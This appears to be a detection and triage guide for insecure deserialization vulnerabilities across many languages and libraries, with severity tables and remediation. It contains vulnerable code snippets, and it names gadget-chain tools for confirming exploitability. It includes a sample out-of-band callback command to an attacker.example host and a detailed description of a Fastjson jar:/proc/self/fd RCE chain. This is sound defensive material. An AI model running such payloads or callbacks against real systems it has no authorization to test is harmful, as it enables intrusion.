---
name: insecure_deserialization
version: "1.0"
description: Insecure deserialization detection covering Java native serialization, JSON libraries, YAML/XML, LDAP entry poisoning via SearchControls returningObj, implicit Python pickle sinks (pyzmq, msgpack-numpy), Rails cache and signed-cookie Marshal paths, and .NET/PHP/Node/Ruby/Go/Rust sinks
---

# Insecure Deserialization

Insecure deserialization happens when an application reconstructs objects from untrusted external data without enforcing type constraints, giving attackers the ability to craft payloads that trigger remote code execution, escalate privileges, or exhaust server resources. Java environments are especially high-risk because of the extensive gadget chain ecosystem available to attackers.

## CWE Classification

- **CWE-502**: Deserialization of Untrusted Data
- **CWE-915**: Improperly Controlled Modification of Dynamically-Determined Object Attributes

## Where to Look

### Java Native Serialization (`ObjectInputStream`)
- `ObjectInputStream.readObject()` / `readUnshared()` called on untrusted input
- Magic bytes: `AC ED 00 05` (hex) or `rO0` (Base64)
- Content-Type: `application/x-java-serialized-object`
- Gadget chains: CommonsCollections, BeanUtils, Spring, ROME, C3P0, Hibernate
- **SOAP / XML debug monitors**: TCP or HTTP listeners (SOAPMonitor-class) that wrap an accepted `Socket.getInputStream()` / request body in `ObjectInputStream` — treat as **network-reachable native deserialization** even when the class name is "Monitor" or "Admin" (not a business API). Same TRUE POSITIVE rules as any other `readObject` on untrusted bytes.

### SOAP `xsi:type` / auto class-load (type confusion → constructor / static-init)
Distinct from XMLDecoder: some SOAP engines and custom deserializers map inbound `xsi:type` (or fault `<exceptionName>`) to `Class.forName(..., true)` / bean constructors **without** an allowlist (`doAutoTypes`, open type tables).

- **VULN**: Unrestricted `xsi:type` → instantiate arbitrary registered/type-table class (constructor runs); SOAP-fault `exceptionName` (or equivalent) → `Class.forName(name, true, …)` from request-influenced detail.
- **SAFE**: Closed type allowlist; `doAutoTypes` / auto-mapping disabled; fault detail never drives class load.
- Cross-ref engine config flags in `api_security.md` (*SOAP engine admin & auto-type*).

### Java LDAP entry poisoning (`SearchControls` returningObj — CWE-502)
JNDI LDAP clients can **deserialize Java objects stored in directory attributes** when a search asks for returned objects. This is **not** “typed Attribute values” and **not** LDAP filter injection (`ldap_injection.md`).

- **VULN**: `new SearchControls(scope, countLimit, timeLimit, attrs, true, deref)` — 5th ctor arg `returningObj=true` (or `setReturningObjFlag(true)`) on `DirContext`/`InitialDirContext.search(...)`. An attacker who can write an LDAP entry (or poison a reachable directory) plants `javaSerializedData` / object-factory attributes; the client reconstructs them → RCE (Pawn Storm / entry-poisoning class).
- **Also VULN**: `com.sun.jndi.ldap.object.trustURLCodebase=true` (or equivalent) combined with object recovery — remote codebase loading.
- **SAFE**: `returningObj=false` (default) / omit object recovery; read only string attributes; never enable URL codebase trust for LDAP object factories.
- **Do not CLOSE** because staff say “we need typed attributes from AD” — typed `Attribute.get()` works with `returningObj=false`; `true` enables **object deserialization**, not mere string typing.
- Filter/DN concatenation on the same call is a **separate** `ldap_injection` finding; keep both when both apply.

### JSON Deserialization Libraries

**Fastjson (com.alibaba.fastjson)**
- `JSON.parseObject(input)` / `JSON.parse(input)` — auto-type can instantiate arbitrary classes
- `@type` field in JSON enables polymorphic deserialization leading to RCE
- AutoType enabled by default in older versions; the 1.x autoType **denylist has been serially bypassed** (1.2.25/42/47/68/80…), so a point version is never proof of safety
- Key CVEs: CVE-2017-18349 (autoType RCE in < 1.2.25), CVE-2022-25845 (autoType bypass in < 1.2.83), **CVE-2026-16723** (`@JSONType` resource-probe / `jar:` RCE in **1.2.68–1.2.83**, fixed in **1.2.84**)
- **1.x status:** 1.2.83 was long treated as the “final safe” 1.x — that claim is false for CVE-2026-16723. A bare or type-bound `parse`/`parseObject` on untrusted input is RCE-capable on **1.2.68–1.2.83** with AutoType off and no classpath gadget (Spring Boot fat-jar). **Do not treat “upgrade to 1.2.83” as a fix.** Vendor P0 for this CVE: **`com.alibaba:fastjson:1.2.84`**, **safeMode**, **`*_noneautotype`**, or migrate to **fastjson2**. Residual 1.x EOL hygiene still favors 2.x even after 1.2.84.
- **“Moving to a newer 1.x is NOT a fix”** applies to upgrades **≤1.2.83** and to hand-wavy “pick any newer 1.x” without evidence. It does **not** forbid closing **CVE-2026-16723 Critical** when the classpath is demonstrably **≥1.2.84** (or noneautotype / safeMode). Cap residual 1.2.84+ untrusted parse as **Low/Info (EOL hygiene)** unless another 1.x autoType/gadget path is visible.
- **Binding to a concrete target type is NOT a mitigation on 1.x.** The type-bound two-argument forms — `JSON.parseObject(str, Dto.class)`, `JSON.parseObject(str, Dto.class, Feature...)`, `JSON.parseObject(str, new TypeReference<Dto>(){})`, `JSON.parseObject(str, Type)` — are just as RCE-capable as the bare form when `str` is untrusted: supplying a target type does **not** disable `@type`/autoType processing on 1.x, and gadget-free single-payload RCE has been demonstrated on 1.2.83 against `parseObject(body, Dto.class)` where the attacker controls only the request body (even when `Dto` is a flat POJO with no `Object`/`Map`/interface fields). Treat `parseObject(<tainted>, <AnyType>)` on 1.x identically to the bare sink. Binding to a concrete type is a real mitigation only with **Jackson/Gson** safe defaults — never with Fastjson 1.x's own parser.
- Detection: Look for `JSON.parseObject()`, `JSON.parse()`, `JSONObject.parseObject()` receiving user-controlled strings — **including the type-bound forms `parseObject(str, T.class)` / `parseObject(str, new TypeReference<T>(){})`**, which are not safer on 1.x
- **`@JSONType` resource-probe path (1.2.48+, exact 1.2.83 terminal reproduced):** even with `autoTypeSupport(false)`, `ParserConfig.checkAutoType` still resolves `typeName.replace('.','/') + ".class"` through the active classloader (`getResourceAsStream`). If the fetched bytes carry runtime-visible `@JSONType`, Fastjson proceeds to `TypeUtils.loadClass` and runs `<clinit>` **before** final DTO binding — so a normal HTTP 200 with a bound DTO does **not** disprove code execution. On 1.2.83, types ending in `Exception`/`Error` can hit a failure-soft branch that lets parsing continue into follow-on probes in the same body. The modern Linux/JDK 17 composition uses a remote `jar:http:` seed (often dot-encoded as `..host:port.path!.Entry`) that caches a JAR, then probes `jar:file:/proc/self/fd/N!…` (or `/dev/fd/N`) to reopen the cached descriptor under an annotated class name; JDK 8 + Spring Boot `LaunchedURLClassLoader`/`LaunchedClassLoader` can also define a remote URL-shaped internal class directly. **`setAutoTypeSupport(false)` is NOT `safeMode`** — only `ParserConfig.setSafeMode(true)` / `-Dfastjson.parser.safeMode=true` (or `Feature.IgnoreAutoType` on the parse call) blocks this ordinary handler-free path; audit any installed `AutoTypeCheckHandler` because handler ordering can re-open admission.
- **Object-typed DTO fields amplify nested `@type` lanes:** `List<Object>`, `Object`, `Map<String,Object>`, or similar in a request DTO parsed by Fastjson 1.x give attacker-controlled array elements a direct route to nested `@type` processing. This is **not** required for Critical severity on 1.x (flat POJOs are already RCE-capable on 1.2.83), but when present it is a high-confidence compound smell — do **not** treat "elements become `JSONObject`/`JSONArray` only" as a mitigation; `@type` inside those nested objects is still evaluated.
- **Static composition smell:** `pom.xml`/`build.gradle` with **both** `com.alibaba:fastjson:1.2.83` (or any 1.x `<2.0`) **and** Spring Boot executable-JAR loader classes (`LaunchedURLClassLoader` / `LaunchedClassLoader`) in the same deployable artifact raises priority for any untrusted `parseObject` sink — runtime also needs egress and compatible loader/OS, but absent `safeMode` the sink stays Critical, not "SSRF-only because JDK 9+".
- **July 2026 / CVE-2026-16723 (Kirill Firsov / FearsOff; Alibaba advisory updated 2026-07-29):** gadget-free chain on **1.2.68–1.2.83** (absent ≤1.2.60) via Spring Boot fat-jar loaders (`LaunchedURLClassLoader`/`LaunchedClassLoader`), AutoType OFF, SafeMode OFF. Mechanism: `checkAutoType` → `getResourceAsStream` on attacker `@type` (SSRF / `jar:http`, incl. integer-IP host forms) → `@JSONType` trust signal → `<clinit>`; JDK 9+ uses `/proc/self/fd` (or `/dev/fd`) reopen after cached JAR. **Fixed in 1.2.84** (rejects URL-special `:`/`!` type names before probe/load). **fastjson2 is not affected by this CVE** (no equivalent resource-probe trust path) — do not Critical-attribute CVE-2026-16723 from the Firsov tweet line “even the latest 2.x” alone. Verified Boot 2/3/4 × JDK 8/11/17/21 per vendor. Binding to a DTO is still not a mitigation on vulnerable 1.x.
- **fastjson2 ≤2.0.62 AutoType whitelist FNV-1a hash match (independent of CVE-2026-16723):** type-name admission compared `@type` via **FNV-1a hash against `acceptHashCodes` without requiring string equality** to the allowlisted name. A colliding `@type` string can pass the hash gate and reach class load / follow-on gadget paths. Vendor hardening in **2.0.63+** verifies accept-name **text after** a hash hit (and rejects URL-special type names / narrows dangerous base-type accepts). **Do not treat “SupportAutoType is off / not enabled” as a SAFE dismiss for untrusted `JSON.parse`/`parseObject`/`JSONB` on classpath `com.alibaba.fastjson2:fastjson2` ≤2.0.62** — that dismiss applies only to **mis-attributing CVE-2026-16723** onto 2.x. SAST: dependency ≤2.0.62 + attacker-reachable parse → **CONFIRM** (Critical unauth / High auth) unless **≥2.0.63** or `-Dfastjson2.parser.safeMode=true` / equivalent SafeMode is proven on the same path. Still never enable deprecated `JSONReader.Feature.SupportAutoType` on untrusted input.

**Jackson (com.fasterxml.jackson.databind)**
- Unsafe when Polymorphic Type Handling (PTH) is enabled:
  - `@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)` or `Id.MINIMAL_CLASS`
  - `ObjectMapper.enableDefaultTyping()` (deprecated, dangerous)
- Safe when using `@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)` with explicit subtypes
- Detection: Look for `enableDefaultTyping()`, `@JsonTypeInfo` with `Id.CLASS`
- Only report as high-confidence when a deserialization entry point is visible (e.g., `@RequestBody`, `getInputStream()`) AND `enableDefaultTyping()` appears in an HTTP binding context without a corresponding `disableDefaultTyping()` / `deactivateDefaultTyping()` call
- If only the dangerous `ObjectMapper` config is visible without an external input entry point, downgrade to suspicious

**Gson (com.google.gson)**
- Generally safe — no polymorphic deserialization by default
- Dangerous only when combined with custom TypeAdapters that instantiate arbitrary classes

**json-io (`com.cedarsoftware.util.io.JsonReader`), Genson, Flexjson, Jodd**
- Various levels of polymorphic type support
- Look for class name fields in JSON (`@class`, `@type`, `class`)

### Nested / recursive object-hydration ("nested deserialization")

A **framework request-body → object mapper** becomes a deserialization gadget engine even without `unserialize()`/`readObject()` or an explicit `@type` field. When a JSON/XML/form API declares a parameter of a concrete class, the framework instantiates it by matching request keys to **constructor parameters or setter names**, and — critically — **recurses**: a constructor parameter (or setter) whose type is *another* class is itself hydrated from the correspondingly-nested request object. With no type allowlist, the attacker walks the constructor/setter graph from the API's declared type through arbitrary intermediate classes until reaching a **sink class** whose constructor/setter has a dangerous side effect — e.g. an XML-parser element (a `SimpleXMLElement` constructor, or any XML-document class that accepts a `sourceData`/URL argument) that parses attacker XML with external-entity loading → **XXE** (blind file read / SSRF / OOB exfil via an external DTD + `php://filter/convert.base64-encode`), a URL/connection field → SSRF, or a getter with a side effect invoked during a serialize round-trip.
- **VULN shape**: a "create object of declared type from array/JSON" routine that resolves constructor args by name and instantiates nested non-primitive parameters recursively, reachable from an HTTP endpoint, with no class/type allowlist. PHP: a DI/object-manager factory that builds an object of a declared class from a request array (`create($className, $dataFromRequest)`), or a REST input-processor that maps body keys to constructor params/setters; Java Jackson/Spring bean-binding of `Object`/interface/`Serializable`-typed fields; any DI-container `create($class, $data)` fed request data. The **depth** of the class graph (5+ nested non-primitive params) is the attack surface, and generic parameter names (`data`, `sourceData`, `options`, `config`) without type hints widen it.
- **SAST signals**: a request-driven DI/factory `create(`/`make(` given a class name plus a data array; a REST/RPC input processor that maps body keys to setters/ctor params without a subtype allowlist; a sink-class constructor reachable from such hydration (`SimpleXMLElement(` from a hydrated field, or an XML-document class taking a `sourceData`/URL argument; XML parser without `LIBXML_NONET`/entity loading disabled — cross-ref `xxe.md`). Related but distinct from mass-assignment (attribute overwrite, `mass_assignment.md`): here the attacker chooses which **classes get instantiated**, not just which fields get set.
- **SAFE**: bind request bodies to explicit flat DTOs (no recursive arbitrary-class instantiation); allowlist permitted subtypes; disable XML external entities in every XML sink; never let request keys select constructor parameter *types*.

### YAML Deserialization

**SnakeYAML**
- `yaml.load(input)` with untrusted input — allows arbitrary class instantiation
- Safe alternative: `yaml.load(input, new SafeConstructor())`
- Detection: Look for `new Yaml().load()` without SafeConstructor on user input

### XML Deserialization

**XMLDecoder**
- `XMLDecoder.readObject()` on untrusted XML allows arbitrary method invocation

**XStream**
- `xstream.fromXML(input)` without security framework leads to RCE
- Safe when using `XStream.addPermission()` with explicit whitelists
- Only report as high-confidence when `fromXML()` input comes from a request body or external source AND no type whitelist/permission constraints (`allowTypes`, `allowTypeHierarchy`, `addPermission`) are visible in the same file or via cross-file security bindings

### Java Expression Languages
- **OGNL** (Struts2): `%{...}` expressions reaching `Runtime.exec()` / `ProcessBuilder`
- **SpEL** (Spring): `#{...}` expressions in user-controlled contexts
- **MVEL/EL**: Dynamic evaluation of user input

### BEAM (Erlang / Elixir)
- `:erlang.binary_to_term(input)` / `erlang:binary_to_term(Input)` **without** the `[:safe]` / `[safe]` option — deserializes attacker bytes into arbitrary terms (new **atoms** → atom-table exhaustion DoS, see `denial_of_service.md`; funs/pids; historically reaches gadget chains). Also `:erlang.binary_to_term(input, [])` (empty opts ≠ safe).
- **SAFE**: pass `[:safe]`, which rejects terms that would create new atoms/funs/external pids; better still, do not `binary_to_term` request/cookie bytes at all — and treat a Phoenix signed-cookie/session store as attacker-controlled if the signing key can leak or verification is skipped.

### Rust (serde ecosystem)
- Binary/format deserializers fed untrusted bytes: `bincode::deserialize(...)`, `postcard::from_bytes(...)`, `serde_pickle::from_slice(...)`, `rmp_serde::from_slice(...)` (MessagePack), and `serde_yaml::from_str(...)` (untrusted YAML → type confusion / resource blow-up). The risk is deserializing into a rich/`#[serde(deny_unknown_fields)]`-less target, or any type whose `Deserialize`/`Drop` does work.
- **SAFE**: deserialize only into narrow, fully-typed structs from a trusted source; prefer length/size-bounded formats; never deserialize attacker bytes into trait objects / dynamically-typed values.

### Apple (Swift / Objective-C)
- `NSKeyedUnarchiver.unarchiveObject(with:)` (Swift) / `[NSKeyedUnarchiver unarchiveObjectWithData:]` (Obj-C) — the legacy **non-secure-coding** unarchive of attacker data instantiates arbitrary classes. Also `PropertyListSerialization.propertyList(from:...)` / `[NSPropertyListSerialization propertyListWithData:]` on untrusted bytes.
- **SAFE**: `NSKeyedUnarchiver.unarchivedObject(ofClass:from:)` / `unarchivedObject(ofClasses:from:)` with `requiresSecureCoding = true` and an explicit class allowlist.

### Ruby / Rails cache serialization

`ActiveSupport::Cache` defaults to a Marshal-backed serializer for cache format versions used by Rails 7.x/8.x. A `:redis_cache_store` or `:mem_cache_store` configured without an explicit non-Marshal coder therefore becomes an RCE sink when an attacker can write **chosen raw cache bytes** to a key the application later reads (for example through an exposed/shared cache, stolen cache credentials, or a protocol-capable SSRF).

- Do not report from the cache declaration alone without establishing a cache-write trust boundary. A normal `Rails.cache.write(key, user_string)` serializes that string itself; it does not let the user supply a complete Marshal stream.
- **Safe-repair contract**: configure a custom `coder:`/serializer whose `load` accepts exactly one data-only format and rejects unknown prefixes and every Marshal signature; rotate the cache namespace or flush old entries; then protect Redis/Memcached with network isolation, authentication, and TLS. Rails' built-in `serializer: :message_pack` does **not** satisfy this contract because its migration fallback still recognizes Marshal payloads. A namespace flush removes old entries but does not stop an attacker from writing a new Marshal-prefixed blob, so never present built-in `:message_pack` alone as the deserialization fix.
- Grep `config.cache_store = :redis_cache_store|:mem_cache_store`, missing `serializer:`/`coder:`, `Rails.cache.read|fetch`, and direct Redis/Memcached writes to the same namespace. Confirm attacker control of bytes and the later read before assigning RCE severity.

### Ruby / Rails signed-cookie serialization

`config.action_dispatch.cookies_serializer = :marshal` makes Rails signed/encrypted cookie reads a native-object deserialization sink. `:hybrid` writes new cookies as JSON but retains a Marshal fallback for legacy cookies, so it is a temporary migration state rather than a permanent safe configuration.

- **Detection**: grep `action_dispatch.cookies_serializer` assigned `:marshal` or `:hybrid`, then locate signed/encrypted cookie reads and any accepted old key rotations. A signature is an integrity barrier, not a safe codec: if a current or still-accepted legacy signing secret leaks, an attacker can submit a validly signed Marshal gadget payload.
- **Triage**: do not claim unconditional unauthenticated RCE from the configuration alone. Confirm a forged-valid-cookie path (weak/leaked/reused secret, accepted compromised rotation key, or signature-verification bypass) and a compatible gadget chain for High/Critical. With strong uncompromised signing and no attacker-mintable cookie, retain the unsafe migration surface as Medium/Review rather than dismissing it as harmless.
- **Safe-repair contract**: switch to `:json`, expire or rename legacy cookies, and remove old key rotations after the migration window. Merely protecting the signing key or waiting for natural expiry while `:hybrid` remains enabled does not remove the Marshal fallback.

## Detection Patterns (Static Analysis)

### High-Confidence Indicators

1. **Fastjson with user input**:
   ```java
   // VULNERABLE: User-controlled JSON parsed with Fastjson
   String json = request.getParameter("data");
   Object obj = JSON.parseObject(json, Feature.SupportAutoType);

   // VULNERABLE: @type in JSON body enables arbitrary class loading
   JSONObject result = JSON.parseObject(requestBody);
   ```

2. **ObjectInputStream from network/file**:
   ```java
   // VULNERABLE: Deserializing untrusted stream
   ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
   Object obj = ois.readObject();
   ```

3. **Jackson with default typing**:
   ```java
   // VULNERABLE: Enables polymorphic deserialization on all types
   ObjectMapper mapper = new ObjectMapper();
   mapper.enableDefaultTyping();
   ```

4. **SnakeYAML without SafeConstructor**:
   ```java
   // VULNERABLE: Allows arbitrary class instantiation from YAML
   Yaml yaml = new Yaml();
   Object obj = yaml.load(userInput);
   ```

5. **XMLDecoder with untrusted input**:
   ```java
   // VULNERABLE: Arbitrary method invocation via XML
   XMLDecoder decoder = new XMLDecoder(new ByteArrayInputStream(userInput.getBytes()));
   Object obj = decoder.readObject();
   ```

6. **XStream without whitelist**:
   ```java
   // VULNERABLE: No type restrictions on deserialization
   XStream xstream = new XStream();
   Object obj = xstream.fromXML(userInput);
   ```

7. **Python pickle/YAML on untrusted input**:
   ```python
   # VULNERABLE: arbitrary code execution via __reduce__
   obj = pickle.loads(request.body)
   data = yaml.load(user_input)  # or yaml.unsafe_load / full_load without SafeLoader
   ```

8. **PHP unserialize on external input**:
   ```php
   // VULNERABLE: gadget chains via magic methods
   $obj = unserialize($_POST['data']);
   ```

9. **Node.js node-serialize / eval deserialization**:
   ```javascript
   // VULNERABLE: IIFE payloads in serialized strings
   const obj = require('node-serialize').unserialize(req.cookies.session);
   ```

### Trace Requirements

For each finding, trace the complete data flow:

- **Source**: Where does the untrusted data originate? (HTTP request body, parameter, header, file upload, message queue, database)
- **Propagation**: How does it reach the deserialization call? (direct pass, variable assignment, method parameter)
- **Sink**: Which deserialization method processes it? (`parseObject`, `readObject`, `fromXML`, `load`)
- **Impact**: What can the attacker achieve? (RCE via gadget chains, DoS via resource exhaustion, data tampering)

### Confirming a Finding (gadget-chain payloads)

To prove exploitability of a deserialization sink, generate a language-appropriate gadget-chain payload and observe an out-of-band signal (DNS/HTTP callback to an OAST host) before attempting RCE:

- **Java native** (`ObjectInputStream`) — `ysoserial` (CommonsCollections, Spring, ROME, C3P0 chains depending on classpath); JVM marshallers via `marshalsec`.
- **.NET** (`BinaryFormatter`, `TypeNameHandling`) — `ysoserial.net`.
- **PHP** (`unserialize`) — `PHPGGC` (framework-specific chains: Laravel, Symfony, Monolog, etc.).
- **Python** (`pickle`/`PyYAML`) — craft a `__reduce__` payload (e.g. via `Fickling`) that triggers a benign OAST callback.
- **Node** (`node-serialize`) — IIFE payload in the serialized `_$$ND_FUNC$$_` field.

Use a harmless callback (`curl http://CANARY.attacker.example/deser`) as the gadget action first; only escalate to command execution with authorization.

## Severity Assessment

| Scenario | Severity | CVSS Range |
|----------|----------|------------|
| Native Java deserialization (`ObjectInputStream`) with known gadgets on classpath | Critical | 9.0-10.0 |
| Fastjson `parseObject` with AutoType enabled on user input | Critical | 9.0-9.8 |
| Fastjson 1.x `parse`/`parseObject(String)` **or type-bound `parseObject(str, T.class)` / `TypeReference`** on user input, no safeMode (autoType being off-by-default does NOT lower this, and a concrete-type bind is NOT a mitigation — 1.x denylist is serially bypassed, 1.2.83 has gadget-free RCE even against `parseObject(body, Dto.class)`) | Critical | 9.0-9.8 |
| fastjson2 ≤2.0.62 untrusted `parse`/`parseObject`/`JSONB` (FNV-1a allowlist hash match without text verify; SupportAutoType off is NOT a dismiss) | Critical | 9.0-9.8 |
| Jackson with `enableDefaultTyping()` on user input | Critical | 9.0-9.8 |
| SnakeYAML `load()` without SafeConstructor on user input | Critical | 9.0-9.8 |
| XMLDecoder / XStream on user input | Critical | 9.0-9.8 |
| Fastjson `parseObject` on internal/trusted input only | Medium | 4.0-6.0 |
| Jackson with explicit `@JsonTypeInfo(Id.NAME)` + whitelist | Low/Info | 0.0-3.0 |
| Python `pickle.loads` / PHP `unserialize` on user input | Critical | 9.0-10.0 |
| Node `node-serialize.unserialize` on cookie/body | Critical | 9.0-9.8 |
| Native deserialize with HMAC verify on same flow (strong secret) | Medium | 4.0-6.0 |

## Remediation

### Fastjson
- **CVE-2026-16723 (1.2.68–1.2.83):** upgrade to **`com.alibaba:fastjson:1.2.84`**, or enable **safeMode**, or use a **`*_noneautotype`** build, or migrate to **fastjson2**. **Do not treat “upgrade to 1.2.83” as a fix.**
- Prefer migrate to Fastjson 2.x (architecturally eliminates the 1.x `@JSONType` resource-probe path). On fastjson2, use **≥2.0.63** (FNV allowlist text verify + related AutoType hardening); interim mitigate with **`-Dfastjson2.parser.safeMode=true`**; do not enable `SupportAutoType` on untrusted input.
- If staying on 1.x without 1.2.84: enable **safeMode** — `ParserConfig.getGlobalInstance().setSafeMode(true)` / `-Dfastjson.parser.safeMode=true` / `fastjson.properties`. `setAutoTypeSupport(false)` alone does **not** block the `@JSONType` resource-probe/`jar:` path on 1.2.83.
- Binding to concrete DTO types is safe only with **Jackson/Gson** safe defaults — **not** on vulnerable Fastjson 1.x (`parseObject(untrusted, Dto.class)` stays RCE-capable on 1.2.68–1.2.83).

### Jackson
- Never use `enableDefaultTyping()`
- Use `@JsonTypeInfo(use = Id.NAME)` with explicit `@JsonSubTypes`
- Enable `PolymorphicTypeValidator` (Jackson 2.10+)

### SnakeYAML
- Always use `new Yaml(new SafeConstructor())` for untrusted input
- Or use SnakeYAML Engine (snakeyaml-engine) which is safe by default

### Java Native Serialization
- Use serialization filters (`ObjectInputFilter`, JEP 290)
- Replace with JSON/Protobuf where possible
- Remove unnecessary gadget libraries from classpath
- Avoid `readObject()` / `readUnshared()` on any stream crossing a trust boundary; prefer DTO mapping from JSON/protobuf
- Configure filter before read:
  ```java
  ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
      "com.example.dto.*;!*");
  ois.setObjectInputFilter(filter);
  Object dto = ois.readObject();
  ```

### Python
- Never `pickle.load(s)` / `pickle.loads()` / `cPickle` on untrusted bytes
- Use `yaml.safe_load()` or `yaml.load(..., Loader=yaml.SafeLoader)` — never bare `yaml.load()` / `unsafe_load` / `full_load` on external input
- Prefer `json.loads()` bound to dict/DTO; avoid `jsonpickle`, `dill`, `marshal.loads`, `torch.load(..., weights_only=False)` on hostile input
- SAST downgrade: `SafeLoader` / `safe_load` / const-compare guard on same flow → suspicious or FP

### PHP
- Avoid `unserialize()` on request/cookie/session/file input; prefer `json_decode()` with schema validation
- If unavoidable: `unserialize($data, ['allowed_classes' => false])` for scalar/array-only payloads
- Look-ahead deserialization (PHP 7+): reject unexpected types before full object graph materializes
- SAST downgrade: `allowed_classes => false` on same call AND no object property access after → lower severity

### Node.js
- Avoid `node-serialize` / `serialize-javascript` `unserialize` on cookies, query params, or request bodies
- Never `eval` / `Function` / `vm.runIn*` to parse serialized or JSON-like user strings
- Prefer `JSON.parse()` into plain objects with explicit field mapping; use `js-yaml` `load` with `schema: yaml.DEFAULT_SAFE_SCHEMA` (v3) or default safe schema (v4+)

### .NET (supplement)
- Set `TypeNameHandling = None` (default); bind to explicit DTO types only
- Avoid `BinaryFormatter`, `LosFormatter`, `NetDataContractSerializer`, `SoapFormatter` on any external stream
- A **custom `SerializationBinder`/`BindToType` (or `TypeNameHandling` filter) that constrains only *one* dimension** is bypassable: allowlisting the **assembly** but leaving the **type name** attacker-controlled (or matching only a namespace prefix) still lets a gadget type inside an already-allowed assembly deserialize. Bind against an **exact allowlist of fully-qualified `(assemblyName, typeName)` pairs**, not a partial/one-sided match

### Data-Only Formats and DTO Binding
- Prefer schema-bound, non-polymorphic formats over native object graphs:
  ```java
  MyDto dto = mapper.readValue(input, MyDto.class);  // not Object.class / HashMap with default typing
  ```
  ```python
  dto = MyModel.model_validate(json.loads(input))  # pydantic/dataclass, not pickle
  ```
  ```protobuf
  message User { string id = 1; string name = 2; }  // protobuf/gRPC — no arbitrary type tags
  ```

### Integrity Protection (When Serialization Is Unavoidable)
- Sign serialized blobs (HMAC-SHA256 or asymmetric) before storage/transit; verify before any `readObject` / `unserialize` / `pickle.loads`
- SAST FP signal: verify-then-deserialize on same flow (HMAC/compare before sink) with server-side secret
- Reject on signature mismatch; do not fall back to deserialize-then-validate

### General
- Never deserialize untrusted data without strict type validation
- Use allowlists (not blocklists) for permitted classes
- Prefer data-only formats (JSON with simple binding, Protocol Buffers) over object serialization
- Cap input size before decode; log type/class failures at deserialization boundaries

## Java Source Detection Rules

### TRUE POSITIVE: Native Java deserialization with user input
- `SearchControls(..., true, ...)` / `setReturningObjFlag(true)` on an LDAP `search` — CONFIRM as LDAP **entry poisoning** (CWE-502) even when the filter/base DN are fully trusted constants. Do not reclassify as “normal directory search” or dismiss because no `ObjectInputStream` appears in source — JNDI performs the deserialize inside the LDAP provider.
- A method contains `new ObjectInputStream(...).readObject()` and accepts data derived from user input (HTTP request body, Base64-decoded parameter, cookie value, or network stream). CONFIRM even if the complete call chain is in another file.
- A helper/utility class such as `SerializationHelper.fromString(String s)` that calls `ObjectInputStream.readObject()` IS a TP sink. Any controller or endpoint that passes a user-controlled string into this helper is vulnerable.
- Base64 decode followed by `ObjectInputStream.readObject()` on the result is the classic Java deserialization pattern — CONFIRM with high confidence when user-controlled bytes flow into this.
- Fastjson `JSON.parseObject(input)` / `JSON.parse(input)` — **and the type-bound `JSON.parseObject(input, T.class)` / `parseObject(input, new TypeReference<T>(){})` forms on vulnerable 1.x (1.2.68–1.2.83)** — without SafeMode/allowlist / **1.2.84+** / migration to 2.x — CONFIRM as CWE-502 (**CVE-2026-16723** when Boot fat-jar composition matches). A concrete target type is **not** a whitelist on vulnerable 1.x.
- **fastjson2 ≤2.0.62** + attacker-reachable `JSON.parse` / `parseObject` / JSONB decode — CONFIRM (FNV-1a `@type` allowlist hash match without text equality). **Do not dismiss** because `SupportAutoType` is absent/off. SAFE only with dependency **≥2.0.63** or proven `fastjson2.parser.safeMode` on that path.
- **Triage guard — do NOT downgrade a Fastjson 1.2.68–1.2.83 untrusted `parse`/`parseObject` (bare or type-bound) on gadget/binding/`setAutoTypeSupport(false)` / “1.2.83 is the safe final 1.x” grounds.** Invalid rationalizations: "autoType is off by default", "1.2.83 patched CVE-2022-25845", "no gadget on classpath", "JDK 9+ is SSRF-only", "flat POJO bind blocks autoType", or **tweet-driven Critical on default fastjson2 for CVE-2026-16723**. Absent safeMode / noneautotype / **≥1.2.84** / fastjson2, an attacker-reachable 1.2.68–1.2.83 sink is **Critical** (unauthenticated) or **High** (authenticated). **Exception:** classpath **≥1.2.84** closes CVE-2026-16723 Critical — do not KEEP Critical solely via “newer 1.x is never a fix”; residual EOL hygiene is Low/Info unless another path is visible. Separately: do **not** use “fastjson2 is not CVE-2026-16723” to dismiss **≤2.0.62** untrusted parse (that is the FNV allowlist issue).
- Jackson `readValue(input, Object.class)` or `readValue(input, HashMap.class)` with `enableDefaultTyping()` active — CONFIRM.
- Helper flows that read a cookie or parameter, Base64-decode it, then call `ObjectInputStream.readObject()` still count as `insecure_deserialization` even when the controller only invokes the helper.
- JDBC or demo flows that first persist attacker-controlled serialized bytes and later call `readObject()` on the retrieved blob are still `insecure_deserialization`; do not discard them just because the immediate source is a database row.

### FALSE POSITIVE: Internal or signed data only
- `ObjectInputStream` used exclusively to deserialize data that was serialized in the same JVM, never crossing a trust boundary.
- Fastjson/Jackson used only to serialize (write) data, never to parse untrusted external input.
- Serialization filters (`ObjectInputFilter`) that restrict allowed classes to a known-safe allowlist.
- **Fastjson CVE-2026-16723 chain:** dependency **≥1.2.84**, or `*_noneautotype` (e.g. `1.2.83_noneautotype`), or **`ParserConfig.setSafeMode(true)` / `-Dfastjson.parser.safeMode=true` / `fastjson.properties` safeMode** — do **not** report Critical for this chain. **Mis-attributing CVE-2026-16723 onto fastjson2** from tweet-only “2.x also RCE” — reject that CVE id; **still evaluate** fastjson2 ≤2.0.62 under the FNV allowlist rule above. **fastjson2 ≥2.0.63** (or proven `fastjson2.parser.safeMode`) default parse without `SupportAutoType` — SAFE for the FNV class. **WAR/external-servlet without** Spring Boot `LaunchedURLClassLoader`/`LaunchedClassLoader` — vendor: non-fat-jar Tomcat/Jetty WAR does not meet the reproduced **1.x** trigger; downgrade to **Low/Review (EOL hygiene)** unless another 1.x path is visible — do **not** treat WAR packaging alone as proof if the app is an executable JAR / Boot loader.
- Do NOT emit `insecure_deserialization` when the deserialization is part of a DIFFERENT vulnerability class already tagged (e.g., if Fastjson autoType is tagged as `component_vulnerability`, do not also tag `insecure_deserialization` for the same sink unless there is a SEPARATE deserialization path).
- Do NOT emit for `ObjectInputStream.readObject()` when the serialized data is exclusively app-generated/trusted with no attacker influence (e.g., internal message queue with authenticated producers only) — second-order DB blobs that were attacker-influenced remain a TRUE POSITIVE (see above).

## Common False Alarms

- Deserialization of internally-generated, signed, or encrypted data with integrity checks
- `ObjectInputStream` used only for trusted IPC between same-trust-domain services
- Jackson/Gson simple binding without polymorphic type handling (safe by default)
- Fastjson used only for serialization (writing JSON), not parsing untrusted input
- Schema-bound deserializers (Avro, protobuf with trusted schema) — excluded by design
